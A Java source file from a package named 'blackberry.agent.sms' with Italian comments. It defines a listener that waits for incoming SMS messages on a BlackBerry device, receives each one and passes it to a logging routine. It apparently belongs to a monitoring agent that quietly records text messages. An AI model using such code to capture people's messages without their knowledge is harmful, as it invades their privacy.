//#preprocess
package blackberry.agent.sms;

import java.io.IOException;

import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.MessageListener;

import blackberry.fs.Path;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

/**
 * Dalla 4.7 implements SendListener
 * 
 * @author user1
 */
class SMSINListener implements MessageListener, Runnable {

    //#ifdef DEBUG
    static Debug debug = new Debug("SMSINListener", DebugLevel.VERBOSE);

    //#endif

    private int messages;
    private final SmsListener smsListener;
    private final MessageConnection conn;

    boolean requestStop;

    public SMSINListener(final MessageConnection conn,
            final SmsListener smsListener) {
        messages = 0;
        this.conn = conn;
        this.smsListener = smsListener;
    }

    /**
     * ESECUZIONE FUORI CONTESTO
     */
    public synchronized void notifyIncomingMessage(final MessageConnection conn) {
        messages++;
        try {
            notifyAll();
        } catch (IllegalMonitorStateException ex) {
            //#ifdef DEBUG_ERROR
            debug.error(ex);
            //#endif
        }
    }

    public void stop() {
        requestStop = true;
        try {
            notifyAll();
        } catch (IllegalMonitorStateException ex) {
            //#ifdef DEBUG_WARN
            debug.warn(ex);
            //#endif
        }
    }

    /**
     * ESECUZIONE FUORI CONTESTO ?
     */
    public void run() {
        requestStop = false;
        while (!requestStop) {
            while (messages > 0) {
                try {
                    init();
                    final javax.wireless.messaging.Message m = conn.receive();
                    smsListener.saveLog(m, true);

                } catch (final IOException e) {
                    e.printStackTrace();
                }
                messages--;
            }
            synchronized (this) {
                try {
                    wait();
                } catch (final Exception ex) {
                    debug.error(ex);
                }
            }
        }
    }
    
    private void init() {
        if(!Path.isInizialized()){
            Path.makeDirs();
        }
        Debug.init();
    }

}
